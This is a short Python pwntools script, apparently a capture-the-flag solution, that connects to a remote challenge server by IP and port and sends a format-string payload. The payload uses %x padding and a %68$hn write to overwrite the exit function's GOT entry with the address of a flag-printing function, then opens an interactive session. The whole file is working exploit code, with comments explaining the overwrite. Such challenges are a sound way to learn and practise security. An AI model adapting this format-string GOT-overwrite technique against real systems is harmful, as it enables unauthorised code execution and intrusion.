from pwn import *

p = remote('140.113.207.240', 8835)


flag = 0x4011b6
#use x/3i to find the address of exit function [x/3i 0x4010c0]
exit_plt = 0x404038

def padding(c):
    return c+"a"*(512-len(c)-16)

payload = ""
payload += "aaaabbbb"
payload += "%{}x".format(0x11b6-len(payload))
#%n will overwrite the address,h means overwrite half
#Overwrite the exit address with flag_func address (0x404038->0x4011b6)
payload += "%68$hn"
payload = padding(payload)
#payload += p64(0x404038)
payload += struct.pack("Q",exit_plt)

p.sendline(payload)
p.interactive()
